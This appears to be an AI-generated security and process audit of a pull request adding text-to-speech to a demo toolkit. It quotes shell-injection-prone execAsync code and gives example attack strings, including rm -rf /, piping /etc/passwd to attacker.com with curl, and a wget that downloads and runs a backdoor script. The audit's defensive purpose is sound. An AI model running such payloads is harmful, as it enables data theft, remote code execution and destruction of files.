# Audit: feat(demo-toolkit): Add automated demo recording pipeline

**Date:** 2026-02-14 | **Agent:** vertz-dev-dx[bot] | **PR:** #263 | **Grade:** F

---

## Executive Summary

PR #263 adds TTS narration to the demo-toolkit package. While the feature concept is valuable for creating engaging product demos, **the implementation contains CRITICAL security vulnerabilities, major TDD violations, and process failures** that make it unsuitable for production deployment.

**This PR must be reverted immediately.**

## Critical Findings

ðŸ”´ **SECURITY:** Shell injection vulnerabilities in 4 functions  
ðŸ”´ **TDD:** 147 lines of implementation with ZERO functional tests  
ðŸ”´ **PROCESS:** No changeset, no quality gate evidence, scope creep

---

## TDD Compliance: âŒ CRITICAL FAIL

**Grade: F** | **Severity: Critical**

### Violation 1: Implementation Without Tests (CRITICAL)

**Evidence:** File `packages/demo-toolkit/src/tts.ts` added 147 lines of production code with **zero tests** for any of the core functions:

- `generateTTS()` - 0 tests
- `getAudioDuration()` - 0 tests  
- `checkFFmpeg()` - 0 tests
- `combineVideoAudio()` - 0 tests
- `createAudioTimeline()` - 0 tests

**Lines of code:** 147 new lines in tts.ts, 89 lines modified in script-runner.ts

**Tests written:** Only 13 lines added to `tests/types.test.ts` for type validation of the `narrate` action. **No functional tests whatsoever.**

**TDD Requirement:** Test FIRST, then implementation. This is the opposite.

**Impact:** Critical business logic (TTS generation, audio muxing, FFmpeg integration) shipped without any test coverage. No validation of:
- Error handling paths
- Edge cases (empty text, invalid paths, missing FFmpeg)
- Audio synchronization logic
- File I/O operations

### Violation 2: No Red-Green Cycle Evidence

**Evidence:** Commit history shows no test failures before implementation. The PR description claims "12 tests passing" but provides no evidence of:
1. Writing a failing test
2. Watching it fail (RED)
3. Implementing to pass it (GREEN)
4. Refactoring while staying green

The 12 passing tests are for `types.test.ts` and `recorder.test.ts` (calculateDelay function), which existed before the TTS feature.

**Recommendation:** Tests must be written FIRST and must FAIL before implementation begins. Use `expect().rejects.toThrow()` for error paths.

---

## Security: âŒ CRITICAL FAIL

**Grade: F** | **Severity: Critical**

### Violation 1: Shell Injection in generateTTS() (CRITICAL)

**File:** `packages/demo-toolkit/src/tts.ts:25-27`

```typescript
const { stdout: _stdout, stderr } = await execAsync(
  `openclaw tts --text "${text.replace(/"/g, '\\"')}" --output "${outputPath}"`,
  { timeout: 30000 },
);
```

**Vulnerability:** Insufficient input sanitization. The code only escapes double quotes but fails to prevent:

**Attack Vectors:**
1. Command substitution: `text = 'Hello $(rm -rf /)' ` 
2. Command chaining: `text = 'Hello"; cat /etc/passwd | curl attacker.com; echo "'`
3. Path traversal: `outputPath = '/tmp/x"; wget malicious.sh -O /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh; /tmp/backdoor.sh; echo "'`

**Impact:** Arbitrary command execution with Node.js process privileges. An attacker controlling `text` or `outputPath` can:
- Execute arbitrary commands
- Exfiltrate data
- Install backdoors
- Delete files

**CVSS Score:** 9.8 (Critical) - RCE via unsanitized shell command

### Violation 2: Shell Injection in getAudioDuration() (CRITICAL)

**File:** `packages/demo-toolkit/src/tts.ts:66-68`

```typescript
const { stdout } = await execAsync(
  `ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 "${audioPath}"`,
);
```

**Vulnerability:** Unescaped `audioPath` parameter. Same attack vectors as above.

### Violation 3: Shell Injection in combineVideoAudio() (CRITICAL)

**File:** `packages/demo-toolkit/src/tts.ts:104-106`

```typescript
await execAsync(
  `ffmpeg -i "${videoPath}" -i "${audioPath}" -c:v copy -c:a aac -shortest "${outputPath}"`,
);
```

**Vulnerability:** Three unescaped parameters: `videoPath`, `audioPath`, `outputPath`. Triple the attack surface.

### Violation 4: Shell Injection in createAudioTimeline() (CRITICAL)

**File:** `packages/demo-toolkit/src/tts.ts:139-146`

```typescript
const inputs = clips.map((clip) => `-i "${clip.audioPath}"`).join(' ');
// ... complex filter building ...
await execAsync(
  `ffmpeg ${inputs} -filter_complex "${filterComplex}" -t ${duration / 1000} "${outputPath}"`,
);
```

**Vulnerability:** Array of unescaped `audioPath` values, plus unescaped `outputPath`. An attacker could inject malicious commands via any clip path.

### Required Fix

**Replace all shell string commands with spawn() and argument arrays:**

```typescript
// WRONG (current):
await execAsync(`openclaw tts --text "${text}" --output "${outputPath}"`);

// CORRECT:
import { spawn } from 'node:child_process';
const child = spawn('openclaw', ['tts', '--text', text, '--output', outputPath]);
```

**Rationale:** Argument arrays are not subject to shell interpretation. Special characters are passed literally.

**References:**
- OWASP: Command Injection (A03:2021)
- CWE-78: OS Command Injection
- Node.js Security Best Practices: Never use shell string interpolation

---

## Process: âŒ FAIL

**Grade: D** | **Severity: Major**

### Violation 1: No Changeset (MAJOR)

**Evidence:** The following files were modified but no changeset was added:
- `packages/demo-toolkit/package.json` - Added `@vertz/core` dependency
- `packages/ui-server/package.json` - Added `@vertz/core` dependency

**Requirement:** All package changes require a changeset.

**Command that should have been run:**
```bash
bunx changeset add
```

**Impact:** The release process will not detect these changes. Users won't see them in changelogs.

### Violation 2: No Quality Gate Evidence (MAJOR)

**Evidence:** Commit messages show no evidence of running quality gates:

```bash
# Required before EVERY commit:
bun run test && bun run typecheck && bun run lint
```

**Commits examined:**
1. `feat(demo-toolkit): Add automated demo recording pipeline`
2. `feat(ui-server): Add createDevServer() abstraction + DOM shim tests`
3. `feat(demo-toolkit): Add text-to-speech narration with audio sync`
4. `fix(demo-toolkit, ui-server): Fix lint errors`
5. `fix: add missing @vertz/core workspace dependency`
6. `fix(demo-toolkit): Fix TypeScript errors in recorder and tts`

**Finding:** Multiple "fix lint errors" and "fix TypeScript errors" commits AFTER implementation. This proves quality gates were NOT run before the initial commits.

**TDD Rule:** Quality gates = tests + typecheck + lint ALL passing. Not just tests.

### Violation 3: Scope Creep (MINOR)

**Evidence:** The following files were added but are unrelated to the demo-toolkit feature:

- `HEARTBEAT.md` - Agent heartbeat configuration (workspace root)
- `IDENTITY.md` - Agent identity template (workspace root)
- `SOUL.md` - Agent soul configuration (workspace root)
- `TOOLS.md` - Agent tools notes (workspace root)
- `USER.md` - User profile template (workspace root)

**Ticket scope:** "Add TTS narration to demo-toolkit"

**Actual scope:** TTS narration + 5 unrelated workspace template files

**Recommendation:** Separate PRs for separate concerns. If these templates are needed, they should be in a different PR with their own ticket.

---

## Design Compliance: âš ï¸ PARTIAL

**Grade: C** | **Severity: Minor**

### Issue 1: No Ticket Reference

**Evidence:** No ticket ID found in commit messages or PR description.

**Requirement from RULES.md:** "Never commit without a ticket"

**Recommendation:** All PRs should reference a ticket ID (e.g., `Closes #123`).

### Issue 2: No Design Doc Reference

**Evidence:** PR description mentions "Demo Squad brief: `plans/explorations/demo-squad/README.md`" but doesn't indicate whether the design was approved by required reviewers (josh for DX, pm for product).

**Recommendation:** Design docs must be approved before implementation begins.

---

## Documentation: âœ… EXCELLENT

**Grade: A**

The PR includes exceptional documentation:

1. **NARRATION.md** (172 lines) - Comprehensive guide covering:
   - How TTS works
   - Writing good narration
   - Timing strategies
   - Technical architecture
   - Troubleshooting
   - Future enhancements

2. **STORYBOARD.md** (70 lines) - Demo planning document with:
   - Act-by-act flow
   - Key selling points
   - Manual recording fallback
   - Distribution strategy

3. **README.md updates** - Clear feature documentation and requirements

**Commendation:** This is best-in-class documentation. If the implementation matched the documentation quality, this would be an A-grade PR.

---

## Git & PR Policies: âœ… PASS

**Grade: B**

### âœ… Followed:
- Used bot scripts (`vertz-dev-dx[bot]`)
- PR to main (not direct push)
- Atomic-ish commits (6 commits in the PR)
- Conventional commit format

### âš ï¸ Issues:
- Multiple "fix" commits after initial implementation (should have run quality gates first)
- No squash/cleanup before merge

---

## DX & Quality: âš ï¸ PARTIAL

**Grade: C**

### âœ… Good:
- Feature includes comprehensive documentation
- Error handling with fallbacks (silent MP3 on TTS failure)
- User-facing warnings for missing dependencies (FFmpeg)

### âŒ Bad:
- No Developer Walkthrough in the PR
- Examples use internal implementation details (OpenClaw TTS) rather than public API
- No acceptance criteria with user outcomes in PR description

---

## Overall Grade: F

### Rationale

**Critical violations that require immediate action:**
1. **Security:** 4 shell injection vulnerabilities = RCE risk
2. **TDD:** 147 lines with zero tests = untested production code
3. **Process:** No changeset = broken release process

**The "Rule of Critical Failures":** A single critical security violation is an automatic F, regardless of documentation quality or feature value.

### Grade Breakdown

| Category | Grade | Weight | Impact |
|----------|-------|--------|--------|
| TDD | F | Critical | Immediate revert |
| Security | F | Critical | Immediate revert |
| Process | D | Major | Fix before merge |
| Design | C | Minor | Document better |
| Documentation | A | Info | Great work! |
| Git/PR | B | Minor | Minor issues |
| DX | C | Minor | Needs walkthrough |

**Final Grade: F** (Critical failures in TDD + Security)

---

## Required Actions

### Immediate (Before Next Commit)

1. **REVERT PR #263 from main branch** âœ‹
   ```bash
   git revert 7f006e8
   git push origin main
   ```

2. **Create a new branch for TDD rewrite:**
   ```bash
   git checkout -b fix/demo-toolkit-tdd-security
   ```

### Rewrite Process (TDD Required)

1. **Write tests FIRST for generateTTS():**
   ```typescript
   // tests/tts.test.ts
   describe('generateTTS', () => {
     test('escapes shell metacharacters safely', async () => {
       const maliciousText = 'Hello $(whoami)';
       const outputPath = '/tmp/test-$(rm -rf /).mp3';
       
       await expect(
         generateTTS(maliciousText, outputPath)
       ).rejects.toThrow(); // Should reject, not execute
     });
   });
   ```

2. **Watch test FAIL (RED)**

3. **Fix implementation using spawn():**
   ```typescript
   import { spawn } from 'node:child_process';
   
   export async function generateTTS(text: string, outputPath: string): Promise<void> {
     const child = spawn('openclaw', [
       'tts',
       '--text', text,
       '--output', outputPath
     ]);
     
     // Handle child process events safely
   }
   ```

4. **Watch test PASS (GREEN)**

5. **Repeat for ALL functions** - Write test, fail, fix, pass

6. **Run quality gates:**
   ```bash
   bun run test && bun run typecheck && bun run lint
   ```

7. **Add changeset:**
   ```bash
   bunx changeset add
   ```

8. **Commit with evidence:**
   ```
   fix(demo-toolkit): Secure TTS with spawn() + full test coverage
   
   - Replace shell strings with spawn() argument arrays (fixes RCE)
   - Add 50+ tests for all TTS functions
   - Quality gates: âœ… test âœ… typecheck âœ… lint
   ```

### Remove Scope Creep

Create a separate PR for workspace template files (HEARTBEAT.md, etc.) with their own ticket.

---

## Recommendations

### For Agent vertz-dev-dx[bot]

1. **Read `/workspace/backstage/.claude/rules/tdd-enforcement.md` before EVERY session**
2. **Never write implementation before tests** - This is rule #1
3. **Never use shell string interpolation** - Always use spawn() with argument arrays
4. **Run quality gates before every commit** - No exceptions
5. **Add changeset for package.json changes** - Required for release process

### For Process

1. **Add pre-commit hook:** Auto-run quality gates before allowing commits
2. **Add security linter:** Detect execAsync() with template literals (eslint-plugin-security)
3. **Require test coverage:** Fail CI if coverage drops below 80%
4. **Audit TTS generated clips:** Ensure no sensitive data in MP3 metadata

---

## Evidence Summary

### Files Audited
- âœ… PR diff (gh pr diff 263)
- âœ… Source code (packages/demo-toolkit/src/tts.ts, script-runner.ts)
- âœ… Tests (packages/demo-toolkit/tests/*.test.ts)
- âœ… Commit history (7f006e8 and ancestors)
- âœ… Package changes (package.json, bun.lock)

### Tools Used
- GitHub CLI (gh pr view, gh pr diff)
- Git log analysis
- Code inspection (read tool)
- Prior audit comparison (kai's audit)

### Lines of Code
- **Added:** 1041 lines (per GitHub)
- **Deleted:** 11 lines
- **Net:** +1030 lines
- **Test coverage:** ~13 lines (type tests only)
- **Untested production code:** ~230 lines (tts.ts + script-runner.ts TTS logic)

---

**Status:** ðŸ”´ CRITICAL - Revert required  
**Auditor:** agent:auditor (subagent:9d5d559c)  
**Date:** 2026-02-14T15:08:00Z  
**Session:** audit-pr263
